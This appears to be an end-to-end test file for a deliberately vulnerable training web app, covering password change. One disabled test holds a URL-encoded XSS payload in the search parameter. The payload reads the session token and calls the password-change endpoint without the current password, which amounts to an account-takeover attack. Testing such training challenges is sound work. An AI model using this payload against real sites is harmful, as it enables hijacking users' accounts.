const config = require('config')

describe('/#/change-password', () => {
  let currentPassword, newPassword, newPasswordRepeat, changeButton

  describe('as Bender', () => {
    protractor.beforeEach.login({ email: 'bender@' + config.get('application.domain'), password: 'OhG0dPlease1nsertLiquor!' })

    beforeEach(() => {
      browser.get('/#/change-password')
      currentPassword = element(by.id('currentPassword'))
      newPassword = element(by.id('newPassword'))
      newPasswordRepeat = element(by.id('newPasswordRepeat'))
      changeButton = element(by.id('changeButton'))
    })

    it('should be able to change password', () => {
      currentPassword.sendKeys('OhG0dPlease1nsertLiquor!')
      newPassword.sendKeys('genderBender')
      newPasswordRepeat.sendKeys('genderBender')
      changeButton.click()

      expect(element(by.css('.confirmation')).getAttribute('hidden')).not.toBeTruthy()
    })
  })

  describe('challenge "csrf"', () => {
    protractor.beforeEach.login({ email: 'bender@' + config.get('application.domain'), password: 'genderBender' })

    xit('should be able to change password via XSS-powered CSRF-attack on password change without passing current password', () => {
      browser.get('/#/search?q=%3Cscript%3E%0Axmlhttp%20%3D%20new%20XMLHttpRequest%3B%0Axmlhttp.open(%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%27)%3B%0Axmlhttp.setRequestHeader(%22Content-type%22%2C%22application%2Fjson%22)%3B%0Axmlhttp.setRequestHeader(%22Authorization%22%2C%60Bearer%20%24%7BlocalStorage.getItem(%22token%22)%7D%60)%3B%0Axmlhttp.setRequestHeader(%22Cookie%22%2C%60token%3D%24%7BlocalStorage.getItem(%22token%22)%7D%60)%3B%0Axmlhttp.send()%0A%3C%2Fscript%3E')
      browser.get('/#/login')
      element(by.id('email')).sendKeys('bender@' + config.get('application.domain'))
      element(by.id('password')).sendKeys('slurmCl4ssic')
      element(by.id('loginButton')).click()

      expect(browser.getCurrentUrl()).toMatch(/\/search/)
    })

    // protractor.expect.challengeSolved({ challenge: 'CSRF' })
  })
})
